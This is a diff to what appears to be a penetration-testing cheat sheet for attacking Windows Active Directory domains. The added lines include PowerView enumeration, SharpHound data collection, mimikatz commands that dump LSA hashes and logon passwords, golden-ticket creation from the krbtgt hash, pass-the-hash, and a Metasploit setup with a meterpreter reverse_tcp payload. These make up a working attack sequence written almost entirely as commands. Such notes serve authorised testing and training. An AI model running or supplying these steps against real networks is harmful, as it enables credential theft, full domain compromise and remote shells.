@@ -26,6 +26,18 @@ Enumerate the domain groups
 Get-NetGroup -GroupName *admin*
 ```
 
+Enumerate shared folder
+
+```
+Invoke-ShareFinder
+```
+
+Enumerate operation systems inside of domain
+
+```
+Get-NetComputer -fulldata | select operatingsystem
+```
+
 Additional queries
 
 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
@@ -82,6 +94,10 @@ powershell -ep bypass
 .\Downloads\SharpHound.ps1
 
 Invoke-Bloodhound -CollectionMethod All -Domain DOMAIN.local -ZipFileName loot.zip
+
+OR (alternative)
+
+SharpHound.exe
 ```
 
 Upload zip file into bloodhound.
@@ -94,7 +110,7 @@ Load mimikatz.
 privilege::debug
 ```
 
-Ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator
+This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly.
 
 Dump hashes
 
@@ -102,7 +118,16 @@ Dump hashes
 lsadump::lsa /patch
 ```
 
-Take hashes offline and crack the hashes
+Login passwords
+
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+Take hashes offline and crack the hashes or run attacks like pass the hash.
+
+[Further Information](https://github.com/gentilkiwi/mimikatz/wiki)
+
 
 ### Golden Ticket
 
@@ -112,6 +137,7 @@ Load mimikatz.
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
+This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket.
 
 Copy the SID of the domain and the NTLM hash of the ticket granting ticket account
 
@@ -122,7 +148,7 @@ After passing the ticket successfuly open a new session (on the mimikatz prompt)
 
 misc::cmd
 ```
-
+Access other Machines! - You will now have another command prompt with access to all other machines on the network.
 ## Service Exploits
 
 Let's start by looking for non-default services:
@@ -326,8 +352,10 @@ set smbdomain
 set smbpass
 set smbuser
 show targets
+set targets 2 (native upload)
 set payload windows/x64/meterpreter/reverse_tcp
 set lhost
+set lport
 ```
 
 On a meterpreter shell load incognito
